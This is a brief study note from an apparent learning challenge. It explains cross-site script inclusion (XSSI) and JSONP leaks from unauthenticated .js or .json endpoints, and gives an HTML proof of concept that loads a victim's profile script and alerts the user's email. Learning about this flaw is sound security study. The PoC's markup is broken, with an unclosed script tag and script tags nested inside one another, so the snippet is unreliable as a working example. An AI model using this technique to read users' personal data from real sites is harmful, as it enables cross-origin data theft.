## 100 Day Learning Challange

# JsonP and XSSI

If any of the information is leaked on an 

- Unprotected Endpoint (Which require No auth-Token, Header and Origin Checks)
- In Any file with Extension `.js` or `.json`

we can include the paticular endpoint to out website and steal the info.

__Example__
https://imran.com/profile.js 

Returns:

```js
var name="imran";
var age=20;
var email="something@gmail.com"
```
The attacker can use POC as

```html
<html>
  <body>
    <script src="https://imran.com/profile.js">
    <script>
      <script>
        alert(email);
      </script>
   </body>
 </html>
```

__Refrences:__
- [https://hackerone.com/reports/138270](https://hackerone.com/reports/138270)
- [https://medium.com/bugbountywriteup/effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty-38ae0b9e5c8a](https://medium.com/bugbountywriteup/effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty-38ae0b9e5c8a)
